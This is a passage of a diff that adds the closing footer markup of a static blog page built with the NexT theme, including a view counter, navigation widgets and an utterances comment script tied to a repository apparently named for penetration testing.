+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="utterances" type="application/json">{"enable":true,"repo":"byroins/penetration-testing","issue_term":"pathname","theme":"github-light"}</script>
+<script src="/js/third-party/comments/utterances.js" defer></script>
+
+</body>
+</html>
